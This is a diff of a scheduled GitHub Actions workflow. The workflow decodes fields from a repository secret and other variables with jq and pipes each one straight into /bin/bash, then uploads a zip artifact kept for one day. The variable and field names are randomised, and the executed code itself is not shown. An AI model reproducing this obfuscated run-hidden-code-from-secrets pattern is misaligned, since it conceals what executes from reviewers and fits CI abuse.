@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '24 0,6,12,18 * * *'
+    - cron: '6 3,9,15,21 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,17 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: Execute
         env:
-          kryfw3700: ${{ secrets.kryfw3700 }}
+          up26: ${{ secrets.up26 }}
         run: |
-          printf '%s' "$kryfw3700" | jq -r .nm1591 | /bin/bash
-          printf '%s' "$j0282" | jq -r .rpgpj060 | /bin/bash
-          echo $ha018 | jq -r .xipw7 | /bin/bash
-          printf '%s' "$j8805" | jq -r .bcv581 | /bin/bash
-          printf '%s' "$jqkcj7100" | jq -r .ynmel736 | /bin/bash
+          printf '%s' "$up26" | jq -r .yb1434 | /bin/bash
+          printf '%s' "$mpn30520" | jq -r .kngi1161 | /bin/bash
+          printf '%s' "$ol677" | jq -r .ssvz50744 | /bin/bash
+          printf '%s' "$zcj0063" | jq -r .zj69 | /bin/bash
+          echo $m526 | jq -r .zromc48 | /bin/bash
+          echo $exk0484 | jq -r .kzc854 | /bin/bash
+          echo $d7152 | jq -r .waxr17898 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: yg9YwdBn
+          name: Y1Xq1vUB
           path: "*.zip"
           retention-days: 1
